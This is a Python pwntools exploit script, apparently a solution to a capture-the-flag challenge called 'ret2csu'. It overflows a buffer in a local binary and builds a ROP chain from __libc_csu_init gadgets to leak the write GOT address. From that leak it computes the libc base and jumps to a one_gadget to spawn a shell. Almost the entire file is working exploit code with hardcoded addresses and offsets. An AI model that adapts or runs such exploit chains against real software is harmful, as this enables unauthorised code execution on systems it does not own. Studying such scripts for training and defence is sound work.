#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./ret2csu')
lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')

padding = 'a'*136

pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40075a
csu_addr = 0x400740
write_got = 0x601018
write_plt = 0x400520
vuln_addr = 0x400698
write_off = lib.symbols['write']

'''
400740:       4c 89 fa                mov    rdx,r15
400743:       4c 89 f6                mov    rsi,r14
400746:       44 89 ef                mov    edi,r13d
400749:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
40074d:       48 83 c3 01             add    rbx,0x1
400751:       48 39 dd                cmp    rbp,rbx
400754:       75 ea                   jne    400740 <__libc_csu_init+0x40>
400756:       48 83 c4 08             add    rsp,0x8
40075a:       5b                      pop    rbx
40075b:       5d                      pop    rbp
40075c:       41 5c                   pop    r12
40075e:       41 5d                   pop    r13
400760:       41 5e                   pop    r14
400762:       41 5f                   pop    r15
400764:       c3                      ret

rbx = 0
rbp = 1
r12 = call <func>
r13 = edi
r14 = rsi
r15 = rdx
'''
def csu(rbx, rbp, r12, r13, r14, r15, ret):
    rop = flat(
        pop_rbx_rbp_r12_r13_r14_r15_ret , rbx ,
        rbp , r12 , r13 , r14 , r15 
    )
    rop2 = flat(
        csu_addr , 'a'*56 , ret       
    )
    payload = rop + rop2
    return payload
	
r.recvuntil('hello ret2csu!\n')

# write(rdi=1, rsi=write_got, rdx=8)
payload = csu(0, 1, write_got, 1, write_got, 8, vuln_addr)

raw_input('#')
r.sendline(padding + payload)

libc_addr = u64(r.recv(8)) - write_off
print '[*] libc addr : ',hex(libc_addr)

one_gadget = libc_addr + 0x10a38c

r.sendline(padding + p64(one_gadget))

r.interactive()
